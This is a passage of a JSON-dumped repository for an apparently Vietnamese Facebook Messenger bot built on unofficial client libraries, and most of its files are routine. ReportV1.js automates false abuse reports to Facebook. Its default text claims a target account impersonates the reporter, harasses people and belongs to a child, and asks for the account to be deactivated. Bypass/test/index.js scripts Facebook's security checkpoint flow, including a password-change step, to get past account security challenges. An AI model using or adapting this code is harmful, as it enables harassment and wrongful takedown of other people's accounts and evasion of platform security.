}\n                    else if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {\n                        api.sendMessage('Invaild link, format link: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n                        callback('Error Link', null);\n                    }\n                    else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {\n                        let Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;\n                        Screenshot.buffer(Format, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    } \n                    else {\n                        let Format = `https://www.facebook.com/${LinkSplit[3]}`;\n                        Screenshot.buffer(Format, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    }\n                }\n                else {\n                    let Form = `https://www.facebook.com/${LinkSplit[1]}`;\n                    Screenshot.buffer(Form, {\n                        cookies: Coookie\n                    }).then(data => {\n                        callback(null,data);\n                    });\n                }\n            }\n                else {\n                    Screenshot.buffer(Link).then(data => {\n                        callback(null,data);\n                    });\n                }\n            return returnPromise;\n    };\n};","path":null,"size_bytes":3546,"size_tokens":null},"lib/fca-auto/src/changeNickname.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function changeNickname(nickname, threadID, participantID, callback) {\n\t\tlet resolveFunc = function () { };\n\t\tlet rejectFunc = function () { };\n\t\tconst returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err) {\n\t\t\t\tif (err) {\n\t\t\t\t\treturn rejectFunc(err);\n\t\t\t\t}\n\t\t\t\tresolveFunc();\n\t\t\t};\n\t\t}\n\n\t\tconst form = {\n\t\t\tnickname: nickname,\n\t\t\tparticipant_id: participantID,\n\t\t\tthread_or_other_fbid: threadID\n\t\t};\n\n\t\tdefaultFuncs\n\t\t\t.post(\n\t\t\t\t\"https://www.facebook.com/messaging/save_thread_nickname/?source=thread_settings&dpr=1\",\n\t\t\t\tctx.jar,\n\t\t\t\tform\n\t\t\t)\n\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t.then(function (resData) {\n\t\t\t\tif (resData.error === 1545014) {\n\t\t\t\t\tthrow { error: \"Trying to change nickname of user isn't in thread\" };\n\t\t\t\t}\n\t\t\t\tif (resData.error === 1357031) {\n\t\t\t\t\tthrow {\n\t\t\t\t\t\terror:\n\t\t\t\t\t\t\t\"Trying to change user nickname of a thread that doesn't exist. Have at least one message in the thread before trying to change the user nickname.\"\n\t\t\t\t\t};\n\t\t\t\t}\n\t\t\t\tif (resData.error) {\n\t\t\t\t\tthrow resData;\n\t\t\t\t}\n\n\t\t\t\treturn callback();\n\t\t\t})\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"changeNickname\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\n\t\treturn returnPromise;\n\t};\n};","path":null,"size_bytes":1441,"size_tokens":null},"lib/fca-auto/Func/ReportV1.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (args,callback) {\n        if (!args.Link && !args.RealName && !args.Content && !args.Gmail) throw new Error(\"Link,RealName,Content,Gmail are required\");\n        if (!args.Link) throw new Error(\"ƒêi·ªÅn args.Link v√†o, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)\");\n        if (!args.RealName) throw new Error(\"ƒêi·ªÅn RealName v√†o, api.Premium.ReportV1(Link,RealName,Content,Time,Gmail,callback)\");\n        if (!args.Gmail) throw new Error(\"ƒêi·ªÅn Gmail v√†o, api.Premium.ReportV1(Link,RealName,Content,Gmail,Time,callback)\");\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        let RealForm;\n        utils.get('https://www.facebook.com/help/contact/209046679279097?locale2=en_US', ctx.jar, null, ctx.globalOptions)\n        .then(function(data) {\n            RealForm = {\n                crt_url: args.Link,\n                crt_name: args.RealName,\n                cf_age: \"9 years\",\n                Field255260417881843: args.Content ? utils.getType(args.Content)==\"String\"? args.Content : \"This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!\" : \"This timeline is impersonating me and my friends. It harass people on Facebook. I think this is a time line of baby, parents are not allowed. Please let Facebook account deactivated for Facebook is increasingly safer. Thank you!\",\n                Field166040066844792: args.Gmail,\n                source: '',\n                support_form_id: 209046679279097,\n                support_form_hidden_fields: JSON.stringify({}),\n                support_form_fact_false_fields: [],\n                lsd: utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n            };\n        }).then(function() {\n            defaultFuncs.postFormData('https://www.facebook.com/ajax/help/contact/submit/page', ctx.jar, RealForm, {}) \n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(async function(dt) {\n                if (dt.__ar == 1) {\n                    callback(null, \"Th√†nh C√¥ng\");\n                }\n                else {\n                    callback(null, \"Th·∫•t B·∫°i\");\n                }\n            });\n        })\n        return returnPromise;\n    }\n};\n","path":null,"size_bytes":2857,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Base/index.js":{"content":"'use strict';\n  \nconst fs = require('fs-extra');\nconst utils = require('../../../utils');\nconst logger = require('../../../logger');\nconst Step_3 = require('./Step_3');\nconst Database = require(\"../../Database\");\nconst Already_Action = { First: 0, Encode: { Status: false, Data: Array }, Decode: { Status: false,  Data: Array } }; \n\nvar ArrPassWord;\n\nif (!fs.existsSync(process.cwd() + '/Horizon_Database') || !fs.existsSync(process.cwd() + '/Horizon_Database/RandPass.json')) {\n  const crypto = require('crypto');\n  ArrPassWord = Array.from({length: 101}, (_,i) => crypto.randomBytes(5).toString('hex'));\n  if (Database().has('Security')) {\n    Database().delete('Security');\n  }\n  if (!fs.existsSync(process.cwd() + '/Horizon_Database')) {\n    fs.mkdirSync(process.cwd() + '/Horizon_Database');\n  }\n  fs.writeFileSync(process.cwd() + '/Horizon_Database/RandPass.json', JSON.stringify(ArrPassWord, null, 2), 'utf8');\n}\n\nelse {\n  ArrPassWord = JSON.stringify(fs.readFileSync(process.cwd() + '/Horizon_Database/RandPass.json'));\n}\n  \n  /**\n   * It creates a random string of a given length\n   * @param length - The length of the string to be generated.\n   * @returns A string of random characters.\n   */\n\n  function CreateFakeType2(length) {\n    var result           = '';\n    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz/+0123456789';\n    var charactersLength = characters.length;\n    for ( var i = 0; i < length; i++ ) result += characters.charAt(Math.floor(Math.random() * charactersLength));\n    return result;\n  }\n\n  /**\n   * It returns a random number between the min and max values.\n   * @param min - The minimum number that can be generated.\n   * @param max - The maximum number that can be generated.\n   * @returns A random number between the min and max values.\n   */\n\n  function Between(min, max) { \n    return parseInt(Math.random() * (max - min) + min);\n  } \n\n  /**\n   * It creates a random number between 0 and 90, then subtracts a random number between 10 and 33 from\n   * it, and then adds 10 to it.\n   * \n   * So, the result is a number between -23 and 90.\n   * \n   * The function also creates a random number between 10 and 70, and a random number between 10 and 33.\n   * \n   * The function returns an object with the following properties:\n   * \n   * Security: the random number between 0 and 90\n   * Previous: the random number between -23 and 90\n   * Secret: the random number between 10 and 33\n   * Number: the random number between 10 and 70\n   * @returns An object with the following properties:\n   */\n\n  function CreateSecurity() {\n    var Security = Between(0,90);\n    var Secret = Between(10,33);\n    return {\n      Security: Security,\n      Previous: parseInt(Security) - Secret,//after + (10) main   + random\n      Secret: Secret, // save\n      Number: Between(10,50) // v·ªã tr√≠ c·ªßa real appstate tr·ª´ 10\n    };\n  }\n\n  /**\n   * It checks if the file exists, if it doesn't, it creates it and writes some data to it. If it does\n   * exist, it reads the data from it and returns it\n   * @param DefaultPassWord - The password you want to use.\n   * @returns An object with the following properties:\n   */\n\n  function CheckAndParse(DefaultPassWord) {\n    var PassWord = new Array();\n    if (!DefaultPassWord) return logger.Warning(\"DefaultPassWord Is Requirements\",function() { process.exit(0); });\n      try {\n        if (!Database().has('Security')) { \n          let Obj = CreateSecurity();\n          Database().set('Security',JSON.stringify(Obj));\n          for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n          return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n        }\n        else {\n          var Data = JSON.parse(Database().get('Security'));\n          if (utils.getType(Data) == \"Object\") {\n            if (!Data.Security || !Data.Previous || !Data.Secret || !Data.Number) { \n              logger.Error('Data Deficit Detection, Reset Data');\n              let Obj = CreateSecurity();\n              Database().set('Security',JSON.stringify(Obj));\n              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n              return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n            }\n            else { \n              for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Data.Security) + parseInt(i)]);\n              return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Data.Number ,Security: Data.Security, Previous: Data.Previous, Secret: Data.Secret };\n            }\n          } \n        }\n      }\n    catch (e) {\n      logger.Error(\"Something went wrong: \" + e, function() {\n        let Obj = CreateSecurity();\n        Database().set('Security',JSON.stringify(Obj));\n        for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(Obj.Security) + parseInt(i)]);\n        return { PassWord: String(DefaultPassWord) + \"-\" + String(PassWord.join('-')), Slot: Obj.Number ,Security: Obj.Security, Previous: Obj.Previous, Secret: Obj.Secret };\n      });\n    }\n  }\n\n  /**\n   * CreatePassWord() takes a string and an object as arguments, and returns a string.\n   * @param DefaultPassWord - The default password that you want to use.\n   * @param ParseObj - This is the object that is being parsed.\n   * @returns A string of the DefaultPassWord and the PassWord array joined by a dash.\n   */\n\n  function CreatePassWord(DefaultPassWord,ParseObj) {\n    var PassWord = new Array();\n      for (let i = 1; i < 10; i ++) PassWord.push(ArrPassWord[parseInt(ParseObj.Security) + parseInt(i)]);\n    return String(DefaultPassWord) + \"-\" + String(PassWord.join('-'));\n  }\n\n  /* Encrypting the AppState with the PassWord. */\n\n  var Encrypt = (AppState,PassWord) => { \n    return require('./Step_3').encryptState(require('./Step_2').Encrypt(require('./Step_1').EncryptState(AppState,PassWord)),PassWord);\n  };\n\n  /* Decrypting the AppState. */\n\n  var Decrypt = (AppState,Slot,PassWord) => { \n    return require('./Step_1').DecryptState(require('./Step_2').Decrypt(require('./Step_3').decryptState(String(AppState[parseInt(Slot) - 10]),PassWord)),PassWord);\n  };\n\n  /* A module that is used to encrypt and decrypt the AppState. */\n\n  module.exports = function(AppState,DefaultPass,Type) { \n    switch (Type) {\n      case \"Encrypt\": {\n        var Data_Return;\n          if (!Already_Action.Encode.Status) {\n            if (Already_Action.First == 0) Already_Action.First = 1;\n            const Obj = CreateSecurity(),PassWord = CreatePassWord(DefaultPass,Obj),AppState_Encrypt = Encrypt(AppState,PassWord); Database().set('Security',JSON.stringify(Obj,null,2));\n            Data_Return = Array.from({length: 60}, (_,i) => { \n              if (i == (parseInt(Obj.Number) - 10)) { \n                return AppState_Encrypt; \n              } \n              else return Step_3.encryptState(CreateFakeType2(AppState_Encrypt.length),PassWord).slice(0,AppState_Encrypt.length);\n            });\n            Already_Action.Encode.Status = true;\n            Already_Action.Encode.Data = Data_Return;\n          }\n          else {\n            Data_Return = Already_Action.Encode.Data;\n          }\n        return Data_Return;\n      }\n      case \"Decrypt\": {\n        var AppState_Decrypt;\n          if (!Already_Action.Decode.Status) {\n            const Parse = CheckAndParse(DefaultPass);\n            AppState_Decrypt = Decrypt(AppState,Parse.Slot,Parse.PassWord);\n            if (Already_Action.First == 0) {\n              Already_Action.Encode.Status = true;\n              Already_Action.Encode.Data = AppState;\n            }\n            Already_Action.Decode.Status = true;\n            Already_Action.Decode.Data = AppState_Decrypt;\n          }\n          else {\n            AppState_Decrypt = Already_Action.Decode.Data;\n          }\n        return AppState_Decrypt;\n      }\n    }\n  };","path":null,"size_bytes":8107,"size_tokens":null},"lib/fca-auto/Extra/Bypass/test/index.js":{"content":"/** By @KanzuWakazaki 03/05/2024 - DD/MM/YYYY */\nvar Form_P1;\nvar CanResolve_P1;\nvar NextToken_P1;\nvar lsd;\nutils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions)\n    .then(function(data) {\n        lsd = utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n        Form_P1 = {\n            lsd: lsd,\n            fb_api_caller_class: 'RelayModern',\n            fb_api_req_friendly_name: 'useEpsilonNavigateMutation',\n            variables: JSON.stringify({\n                input:{\n                    client_mutation_id:\"1\",\n                    actor_id: ctx.userId,\n                    step:\"STEPPER_CONFIRMATION\",\n                    token : JSON.stringify({\n                        sensitive_string_value: Find_And_Parse(data.body)\n                    })\n                },\n                scale:1\n            }),\n            server_timestamps: true,\n            doc_id: 7414856831926043\n        };\n    })\n.then(function() {\n    defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P1, {}) \n    .then(function(resp) {\n        let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n        if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonStepperScreen\" && checkpoint.screen.next_screen == 'CONTACT_POINT_REVIEW' && checkpoint.screen.steps.length === 3 && checkpoint.screen.steps[1].active == true) {\n            NextToken_P1 = checkpoint.screen.token;    \n            return CanResolve_P1 = true;\n        }\n        else return CanResolve_P1 = false;\n    });\n})\n\nvar CanResolve_P2;\nvar NextToken_P2;\n\nlet Form_P2 = {\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 2,\n            actor_id: ctx.userId,\n            step:\"CONTACT_POINT_REVIEW\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P1\n            })\n        },\n        scale: 1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P2, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonContactPointReview\" && checkpoint.screen.contact_points.length >= 1 && checkpoint.screen.contact_points[0].suspicious == \"UNSUSPICIOUS\") {\n        NextToken_P2 = checkpoint.screen.token;    \n        return CanResolve_P2 = true;\n    }\n    else return CanResolve_P2 = false;\n});\n\n\nvar CanResolve_P3;\nvar NextToken_P3;\nlet Form_P3 ={\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 3,\n            actor_id: ctx.userId,\n            step: \"CHANGE_PASSWORD\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P2\n            })\n        },\n        scale:1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P3, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonLoginDetailsConfirmationScreen\" && checkpoint.screen.contact_points.length >= 1) {\n        NextToken_P3 = checkpoint.screen.token;    \n        return CanResolve_P3 = true;\n    }\n    else return CanResolve_P3 = false;\n});\n\nvar CanResolve_P4;\nvar NextToken_P4;\nlet Form_P4 ={\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 4,\n            actor_id: ctx.userId,\n            step: \"OUTRO\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P3\n            })\n        },\n        scale:1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P4, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonOutroScreen\" && checkpoint.screen.fallback.uri == 'https://www.facebook.com/') {\n        NextToken_P4 = checkpoint.screen.token;    \n        return CanResolve_P4 = true;\n    }\n    else return CanResolve_P4 = false;\n});\n\n\nfunction Find_And_Parse(Data) {\n    const regex = /<script\\s+type=\"application\\/json\"\\s+data-content-len=\"([0-9]+)\"\\s+data-sjs\\s*(.*?)\\s*<\\/script>/gs;\n    const matches = Data.matchAll(regex);\n    let Data_resp;\n    for (const match of matches) {\n        if (JSON.parse(JSON.stringify((match[2]))).includes('any_eligible_challenges')) {\n            const Data_ = JSON.parse(match[2].replace('>', ''))\n            Data_resp = findAnyEligibleChallengesAndSiblings(Data_)\n        }\n\n    }\n    \n    \n    function findAnyEligibleChallengesAndSiblings(data) {\n        const screenData = findScreenData(data);\n        if (!screenData) {\n            return null;\n        }\n    \n        const siblings = {};\n        for (const [key, value] of Object.entries(screenData)) {\n            if (key === 'any_eligible_challenges') {\n                siblings[key] = value;\n            } \n            else {\n                siblings[key] = value;\n            }\n        }\n    \n        return siblings;\n    }\n    \n    function findScreenData(data) {\n        if (Array.isArray(data)) {\n            for (const item of data) {\n                const result = findScreenData(item);\n                if (result) {\n                    return result;\n                }\n            }\n        } \n        else if (typeof data === 'object' && data !== null) {\n            if (data.screen) {\n                return data.screen;\n            }\n            for (const value of Object.values(data)) {\n                const result = findScreenData(value);\n                if (result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }    \n    return Data_resp.token || null\n}","path":null,"size_bytes":6410,"size_tokens":null},"modules/commands/gpt3.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"gpt3\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI\",\n    commandCategory: \"AI\",\n    usages: \"gpt3 n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, '/data/api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.gpt3) {}\n\n        return jsonData.gpt3;\n    } catch (error) {}\n};\n\nconst getChatResponse = async (text) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        throw new Error(\"ƒêang c·∫≠p nh·∫≠t!!!\");\n    }\n\n    for (let uid = 1; uid <= 9; uid++) {\n        try {\n            const response = await axios.get(`${apiUrl}?prompt=${encodeURIComponent(text)}&uid=${uid}`);\n            if (response.data && response.data.result) {\n                return response.data.result;\n            }\n        } catch {\n            continue;\n        }\n    }\n\n    throw new Error(\"T·∫•t c·∫£ c√°c UID ƒë·ªÅu kh√¥ng ph·∫£n h·ªìi, vui l√≤ng th·ª≠ l·∫°i sau.\");\n};\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) return reject(error);\n                resolve(info.messageID);\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n        }\n    } catch (error) {}\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (event.type === \"message_reply\") {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3004,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/History.js":{"content":"/**\n * Console History v1.5.1\n * console-history.js\n *\n * Licensed under the MIT License.\n * https://git.io/console\n */\n'use strict'\n\n/* Allow only one instance of console-history.js */\nif (typeof console.history !== 'undefined') {\n    throw new Error('Only one instance of console-history.js can run at a time.')\n}\n\n/* Store the original log functions. */\nconsole._log = console.log\nconsole._info = console.info\nconsole._warn = console.warn\nconsole._error = console.error\nconsole._debug = console.debug\n\n/* Declare our console history variable. */\nconsole.history = []\n\n/* Redirect all calls to the collector. */\nconsole.log = function(dt) {\n    return console._intercept('log', dt, arguments)\n}\nconsole.info = function(dt) {\n    return console._intercept('info', dt, arguments)\n}\nconsole.warn = function(dt) {\n    return console._intercept('warn', dt, arguments)\n}\nconsole.error = function(dt) {\n    return console._intercept('error', dt, arguments)\n}\nconsole.debug = function(dt) {\n    return console._intercept('debug', dt, arguments)\n}\n\n/* Give the developer the ability to intercept the message before letting\n   console-history access it. */\nconsole._intercept = function(type, data, args) {\n    // Your own code can go here, but the preferred method is to override this\n    // function in your own script, and add the line below to the end or\n    // begin of your own 'console._intercept' function.\n    // REMEMBER: Use only underscore console commands inside _intercept!\n    console._collect(type, data,args)\n}\n\n/* Define the main log catcher. */\nconsole._collect = function(type, data, args) {\n    // WARNING: When debugging this function, DO NOT call a modified console.log\n    // function, all hell will break loose.\n    // Instead use the original console._log functions.\n\n    // All the arguments passed to any function, even when not defined\n    // inside the function declaration, are stored and locally available in\n    // the variable called 'arguments'.\n    //\n    // The arguments of the original console.log functions are collected above,\n    // and passed to this function as a variable 'args', since 'arguments' is\n    // reserved for the current function.\n\n    // Collect the timestamp of the console log.\n    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' };\n\n    var time = new Date().toLocaleDateString('vi-VN', options)\n\n    // Make sure the 'type' parameter is set. If no type is set, we fall\n    // back to the default log type.\n    if (!type) type = 'log'\n\n    // To ensure we behave like the original console log functions, we do not\n    // output anything if no arguments are provided.\n    if (!args || args.length === 0) return\n\n    // Act normal, and just pass all original arguments to\n    // the origial console function :)\n    console['_' + type].apply(console, args)\n\n    // Get stack trace information. By throwing an error, we get access to\n    // a stack trace. We then go up in the trace tree and filter out\n    // irrelevant information.\n    var stack = false\n    try {\n        throw Error('')\n    } catch (error) {\n        // The lines containing 'console-history.js' are not relevant to us.\n        var stackParts = error.stack.split('\\n')\n        stack = []\n        for (var i = 0; i < stackParts.length; i++) {\n            if (stackParts[i].indexOf('console-history.js') > -1 ||\n                stackParts[i].indexOf('console-history.min.js') > -1 ||\n                stackParts[i] === 'Error') {\n                continue\n            }\n            stack.push(stackParts[i].trim())\n        }\n    }\n    try {\n        data = data.replace(/[\\u001b\\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,'')\n    }\n    catch (e) {\n        data = data;\n    }\n    // Add the log to our history.\n    console.history.push({\n        type: type,\n        timestamp: time,\n        message: data,\n        stack: stack\n    })\n}","path":null,"size_bytes":3962,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Balancer.js":{"content":"class APILoadBalancer {\n    constructor(Api1,Api2 ,preferredRatio = 0.85, forceType2) {\n        this.Api1 = Api1;\n        this.Api2 = Api2;\n        this.preferredRatio = preferredRatio; \n        this.totalRequests = 0;\n        this.api2Requests = 0;\n    }\n\n    async makeRequest(requestData) {\n        try {\n            this.totalRequests++;\n            const currentRatio = this.api2Requests / this.totalRequests;\n\n            if (currentRatio < this.preferredRatio) {\n                this.api2Requests++;\n                return await this.Api2(...requestData)\n            } else {\n                return await this.Api1(...requestData);\n            }\n        } catch (error) {\n            return await this.fallbackRequest(requestData);\n        }\n    }\n\n    async fallbackRequest(requestData) {\n        try {\n            if (this.api2Requests / this.totalRequests >= this.preferredRatio) {\n                this.api2Requests++;\n                return await this.Api2(...requestData);\n            } else {\n                return await this.Api1(...requestData);\n            }\n        } catch (error) {\n            throw new Error('Balancer Error, contact fb.com/Lazic.Kanzu');\n        }\n    }\n\n    getStats() {\n        return {\n            totalRequests: this.totalRequests,\n            api2Requests: this.api2Requests,\n            api1Requests: this.totalRequests - this.api2Requests,\n            currentRatio: (this.api2Requests / this.totalRequests) * 100\n        };\n    }\n}\n\nmodule.exports = APILoadBalancer;\n","path":null,"size_bytes":1513,"size_tokens":null},"modules/commands/luachon.js":{"content":"module.exports.config = {\n\tname: \"luachon\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",\n\tdescription: \"Nh·ªù bot ch·ªçn gi√∫p m·ªôt trong nh·ªØng th·ª© b·∫°n c·∫ßn l√†m\",\n\tcommandCategory: \"C√¥ng c·ª•\",\n\tusages: \"luachon 123 | 456 | ...\",\n\tcooldowns: 5\n};\n\nmodule.exports.languages = {\n\t\"vi\": {\n\t\t\"return\": \"B·∫°n n√™n ch·ªçn: %1\"\n\t},\n\t\"en\": {\n\t\t\"return\": \"%1 is more suitable with you, I think so :thinking:\"\n\t}\n}\n\nmodule.exports.run = async ({ api, event, args, getText }) => {\n\tconst { threadID, messageID } = event;\n\n\tvar input = args.join(\" \").trim();\n\tif (!input) return global.utils.throwError(this.config.name, threadID, messageID);\n\tvar array = input.split(\" | \");\n\treturn api.sendMessage(getText(\"return\", array[Math.floor(Math.random() * array.length)]),threadID, messageID);\n}","path":null,"size_bytes":805,"size_tokens":null},"lib/fca-auto/Extra/Src/Change_Environment.js":{"content":"module.exports = async function(callback) {\n    const got = require('got');\n    const log = require('npmlog');\n    const fs = require('fs');\n    const Database = require('../../Extra/Database');\n    const Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\n    const Check = fs.readFileSync(process.cwd() + \"/replit.nix\", { encoding: 'utf8' });\n    switch (Check.includes('pkgs.nodejs-14_x')) {\n        case true: {\n            Database(true).set(\"NeedRebuild\", false);\n            return;\n        }\n        case false: {\n            log.warn(\"[ FCA-HZI ] ‚Ä¢\",Language.EVMChange);\n            const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/repl.nix');\n            fs.writeFileSync(process.cwd() + \"/replit.nix\", body, { encoding: 'utf8' });\n            log.info(\"[ FCA-HZI ] ‚Ä¢\",Language.EVMChangeSuccess);\n            await new Promise(resolve => setTimeout(resolve, 3000));\n            Database(true).set(\"NeedRebuild\", true);\n            process.exit(1);\n        }\n    }\n\n}","path":null,"size_bytes":1134,"size_tokens":null},"includes/handle/handleCommandEvent.js":{"content":"module.exports = function ({ api, models, Users, Threads, Currencies }) {\n    const logger = require(\"../../utils/log.js\")\n    return function ({ event }) {\n        const { allowInbox } = global.config;\n        const { userBanned, threadBanned } = global.data;\n        const { commands, eventRegistered } = global.client;\n        var { senderID, threadID } = event;\n        var senderID = String(senderID);\n        var threadID = String(threadID);\n        if (userBanned.has(senderID) || threadBanned.has(threadID) || allowInbox == !![] && senderID == threadID) return;\n        for (const eventReg of eventRegistered) {\n            const cmd = commands.get(eventReg);\n            var getText2;\n\n            if (cmd.languages && typeof cmd.languages == 'object') \n                getText2 = (...values) => {\n                const commandModule = cmd.languages || {};\n                if (!commandModule.hasOwnProperty(global.config.language)) \n                    return api.sendMessage(global.getText('handleCommand','notFoundLanguage', cmd.config.name), threadID, messengeID); \n                var lang = cmd.languages[global.config.language][values[0]] || '';\n                for (var i = values.length; i > 0x16c0 + -0x303 + -0x1f * 0xa3; i--) {\n                    const expReg = RegExp('%' + i, 'g');\n                    lang = lang.replace(expReg, values[i]);\n                }\n                return lang;\n            };\n            else getText2 = () => {};\n            try {\n                const Obj = {};\n                Obj.event = event \n                Obj.api = api\n                Obj.models = models\n                Obj.Users = Users\n                Obj.Threads = Threads \n                Obj.Currencies = Currencies \n                Obj.getText = getText2;\n                if (cmd) cmd.handleEvent(Obj);\n            } catch (error) {\n                logger(global.getText('handleCommandEvent', 'moduleError', cmd.config.name), 'error');\n            }\n        }\n    };\n};","path":null,"size_bytes":1987,"size_tokens":null},"modules/commands/rem.js":{"content":"module.exports.config = {\n  name: \"rem\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: 